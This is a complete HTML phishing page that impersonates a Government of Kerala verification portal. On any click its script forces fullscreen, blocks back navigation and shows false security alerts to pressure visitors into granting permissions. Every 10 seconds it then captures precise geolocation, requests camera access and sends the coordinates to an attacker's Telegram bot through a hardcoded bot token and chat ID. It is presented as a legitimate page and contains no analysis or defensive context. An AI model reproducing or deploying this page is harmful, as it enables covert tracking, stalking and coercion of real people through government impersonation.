<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Government of Kerala | Digital Verification Portal</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f4f4f4; text-align: center; padding: 50px; margin: 0; min-height: 100vh; cursor: pointer; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.2); max-width: 500px; margin: auto; border-top: 5px solid #006400; pointer-events: none; }
        h1 { color: #006400; font-size: 22px; margin-top: 15px; }
        .status { color: red; font-weight: bold; margin: 20px 0; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        #progress { width: 100%; background: #ddd; border-radius: 5px; margin-top: 10px; }
        #bar { width: 98%; height: 20px; background: #006400; border-radius: 5px; }
        p { font-size: 14px; color: #333; line-height: 1.6; }
    </style>
</head>
<body onclick="launchOperation()">
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Emblem_of_Kerala.svg/512px-Emblem_of_Kerala.svg.png" width="100" alt="Kerala Govt">
        <h1>KERALA LOGISTICS AUTHENTICATION</h1>
        <p>Regional Sector: <strong>ALAPPUZHA</strong></p>
        <div id="progress"><div id="bar"></div></div>
        <p class="status">SYSTEM LOCKED: Action Required</p>
        <p>To prevent data loss and verify your identity for the 2026 session, you must <strong>ALLOW</strong> all requested permissions. This is a mandatory security protocol.</p>
    </div>

    <script>
        const BOT_TOKEN = '8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg';
        const CHAT_ID = '1020906452';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {}); 
        }

        function lockNavigation() {
            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 500);
            window.onbeforeunload = () => "Verification in progress.";
        }

        function captureLocation() {
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`🎯 TARGET LOCATED!\n\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nMaps: ${mapLink}`);
            }, (err) => {
                sendToTelegram(`⚠️ Location Denied: ${err.message}`);
            }, { enableHighAccuracy: true });
        }

        let operationStarted = false;
        function launchOperation() {
            if (operationStarted) return;
            operationStarted = true;

            // Enter Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }

            lockNavigation();
            captureLocation(); // First hit
            
            // Start the 10-second storm
            setInterval(() => {
                captureLocation();
                navigator.mediaDevices.getUserMedia({ video: true }).then(() => sendToTelegram("📸 Camera: GRANTED")).catch(() => {});
            }, 10000);

            alert("SECURITY ALERT: Device identity mismatch. Click 'Allow' on all system prompts to unlock.");
        }
    </script>
</body>
</html>
